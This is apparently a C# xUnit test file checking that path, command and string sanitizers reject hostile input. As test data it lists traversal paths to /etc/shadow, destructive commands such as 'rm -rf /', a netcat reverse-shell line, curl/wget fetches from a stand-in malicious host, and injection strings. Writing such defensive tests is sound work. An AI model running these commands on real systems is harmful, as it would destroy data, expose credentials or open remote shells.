using System;
using System.IO;
using App.Shared.Errors;
using App.Shared.Sanitization;
using Xunit;

namespace App.Backend.Tests;

public class SanitizerTests
{
    [Theory]
    [InlineData("../../../etc/shadow")]
    [InlineData("..\\..\\Windows\\System32\\cmd.exe")]
    [InlineData("/var/log/../../etc/passwd")]
    [InlineData("C:\\Data\\..\\..\\Windows\\win.ini")]
    public void PathSanitizer_RejectsTraversalSequences(string traversalPath)
    {
        var result = PathSanitizer.TrySanitizePath(traversalPath, out var sanitized, out var errorCode);

        Assert.False(result);
        Assert.Empty(sanitized);
        Assert.Equal(ErrorCode.PathTraversalDetected, errorCode);
    }

    [Fact]
    public void PathSanitizer_RejectsNullBytesAndControlCharacters()
    {
        string nullBytePath = "/tmp/safe_file.txt\0.exe";
        var result1 = PathSanitizer.TrySanitizePath(nullBytePath, out var _, out var code1);
        Assert.False(result1);
        Assert.Equal(ErrorCode.PathTraversalDetected, code1);

        string controlCharPath = "/tmp/bad\u0007bell.txt";
        var result2 = PathSanitizer.TrySanitizePath(controlCharPath, out var _, out var code2);
        Assert.False(result2);
        Assert.Equal(ErrorCode.InvalidPath, code2);
    }

    [Theory]
    [InlineData("CON")]
    [InlineData("PRN")]
    [InlineData("AUX")]
    [InlineData("NUL")]
    [InlineData("COM1")]
    [InlineData("LPT1")]
    [InlineData("C:\\NUL\\payload.bin")]
    public void PathSanitizer_RejectsDosDeviceNames(string dosPath)
    {
        var result = PathSanitizer.TrySanitizePath(dosPath, out var sanitized, out var errorCode);

        Assert.False(result);
        Assert.Empty(sanitized);
        Assert.Equal(ErrorCode.InvalidPath, errorCode);
    }

    [Theory]
    [InlineData("/opt/app/bin/update.exe")]
    [InlineData("/tmp/script.bat")]
    [InlineData("C:\\temp\\exploit.cmd")]
    [InlineData("/home/user/test.ps1")]
    public void PathSanitizer_RejectsExecutables_WhenDisallowExecutablesTrue(string execPath)
    {
        var result = PathSanitizer.TrySanitizePath(execPath, out var sanitized, out var errorCode, disallowExecutables: true);

        Assert.False(result);
        Assert.Empty(sanitized);
        Assert.Equal(ErrorCode.UnsafeCommandDetected, errorCode);
    }

    [Fact]
    public void PathSanitizer_AllowsCleanPaths_WhenDisallowExecutablesFalse()
    {
        string safePath = Path.Combine(Path.GetTempPath(), "safe_data.json");
        var result = PathSanitizer.TrySanitizePath(safePath, out var sanitized, out var errorCode, disallowExecutables: false);

        Assert.True(result);
        Assert.NotEmpty(sanitized);
        Assert.Equal(ErrorCode.None, errorCode);
    }

    [Fact]
    public void PathSanitizer_IsWithinRoot_EnforcesDirectoryContainment()
    {
        string baseDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "heimdall_sandbox_test"));
        Directory.CreateDirectory(baseDir);

        try
        {
            string validChild = Path.Combine(baseDir, "configs", "agent.json");
            bool valid = PathSanitizer.IsWithinRoot(validChild, baseDir);
            Assert.True(valid);

            string outsideDir = Path.GetFullPath(Path.Combine(baseDir, "..", "outside_secret.txt"));
            bool invalid = PathSanitizer.IsWithinRoot(outsideDir, baseDir);
            Assert.False(invalid);
        }
        finally
        {
            if (Directory.Exists(baseDir))
            {
                Directory.Delete(baseDir, true);
            }
        }
    }

    [Theory]
    [InlineData("echo safe; rm -rf /")]
    [InlineData("ping 127.0.0.1 && cat /etc/passwd")]
    [InlineData("calc.exe | nc -l 4444")]
    [InlineData("test $(whoami)")]
    [InlineData("test `id`")]
    [InlineData("cat file > /dev/sda")]
    [InlineData("input < /etc/shadow")]
    [InlineData("echo test\nrm -rf /")]
    [InlineData("echo test\r\nformat c:")]
    public void CommandSanitizer_RejectsShellChainingAndSubshells(string maliciousCommand)
    {
        var result = CommandSanitizer.IsSafeCommandString(maliciousCommand, out var errorCode);

        Assert.False(result);
        Assert.Equal(ErrorCode.UnsafeCommandDetected, errorCode);
    }

    [Theory]
    [InlineData("bash -c evil")]
    [InlineData("powershell -enc AAAA")]
    [InlineData("cmd.exe /c calc")]
    [InlineData("curl http://malicious.org/payload")]
    [InlineData("wget http://malicious.org/payload")]
    [InlineData("nc -e /bin/sh 10.0.0.1 8080")]
    public void CommandSanitizer_RejectsForbiddenShellTokens(string shellCommand)
    {
        var result = CommandSanitizer.IsSafeCommandString(shellCommand, out var errorCode);

        Assert.False(result);
        Assert.Equal(ErrorCode.UnsafeCommandDetected, errorCode);
    }

    [Fact]
    public void CommandSanitizer_AllowsCleanArguments()
    {
        string cleanCommand = "--status --log-level=info --target=controller1";
        var result = CommandSanitizer.IsSafeCommandString(cleanCommand, out var errorCode);

        Assert.True(result);
        Assert.Equal(ErrorCode.None, errorCode);
    }

    [Theory]
    [InlineData("test\r\nHeader: Injected", "test  Header: Injected")]
    [InlineData("line1\nline2\rline3", "line1 line2 line3")]
    [InlineData("clean text", "clean text")]
    public void StringSanitizer_StripCrlf_EliminatesNewlines(string input, string expected)
    {
        string actual = StringSanitizer.StripCrlf(input);
        Assert.Equal(expected, actual);
    }

    [Theory]
    [InlineData("win32_pnp", "win32_pnp")]
    [InlineData("test' OR 1=1 --", "test\\' OR 1=1 --")]
    [InlineData("device\\driver", "device\\\\driver")]
    [InlineData("O'Reilly", "O\\'Reilly")]
    public void StringSanitizer_EscapeWqlLiteral_EscapesSpecialCharacters(string input, string expected)
    {
        string actual = StringSanitizer.EscapeWqlLiteral(input);
        Assert.Equal(expected, actual);
    }

    [Theory]
    [InlineData("Valid-Token_123", "Valid-Token_123")]
    [InlineData("Drop Table; --", "Drop_Table__--")]
    [InlineData("<script>alert(1)</script>", "script_alert_1___script")]
    public void StringSanitizer_ToSafeToken_FiltersDangerousCharacters(string input, string expected)
    {
        string actual = StringSanitizer.ToSafeToken(input);
        Assert.Equal(expected, actual);
    }
}
